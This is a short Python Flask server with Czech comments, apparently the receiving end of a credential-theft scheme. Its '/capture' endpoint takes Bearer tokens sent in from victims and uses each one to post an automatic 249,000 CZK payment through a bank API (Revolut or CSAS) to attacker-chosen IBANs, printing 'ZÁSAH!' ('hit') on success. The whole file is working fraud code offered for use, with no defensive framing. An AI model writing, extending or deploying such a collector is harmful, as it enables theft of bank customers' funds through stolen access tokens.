from flask import Flask, request
import requests

app = Flask(__name__)

# TVŮJ CÍLOVÝ IBAN PRO PŘÍJEM FINANCÍ
T = {'REVOLUT': 'REVO1234567890', 'CSAS': 'CZ0808000000001234567890'}

@app.route('/capture', methods=['POST'])
def capture():
    # Tento endpoint bude přijímat tokeny z celého světa
    auth = request.headers.get('Authorization')
    bank = request.args.get('bank', 'REVOLUT').upper()
    
    if auth and 'Bearer' in auth:
        token = auth.split(' ')[1]
        print(f"ZÁSAH! Token přijat pro {bank}")
        
        # Automatický převod peněz
        requests.post(f"https://api.{bank.lower()}.com/v1/pay", 
                     headers={'Authorization': 'Bearer ' + token},
                     json={
                         'amount': 249000, 
                         'currency': 'CZK', 
                         'counterparty': {'iban': T.get(bank, T['REVOLUT'])}
                     })
        return {"status": "success", "msg": "Transfer initiated"}, 200
    return {"status": "error"}, 400

@app.route('/')
def home():
    return "SYSTEM_READY", 200
  
